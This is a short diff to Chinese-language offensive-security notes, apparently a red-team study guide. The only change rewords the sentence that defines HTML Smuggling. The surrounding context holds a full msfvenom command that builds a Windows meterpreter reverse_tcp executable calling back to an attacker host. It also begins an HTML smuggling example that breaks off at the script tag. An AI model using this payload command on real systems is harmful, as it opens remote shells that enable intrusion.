@@ -19,7 +19,7 @@ Ex: windows/meterpreter/reverse_tcp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o staged.exe
 ```
 ## HTML Smuggling 
-想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，為HTML Smuggling
+想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，這種行為就稱為HTML Smuggling
 ### Example
 ```
 <html><body><script>	
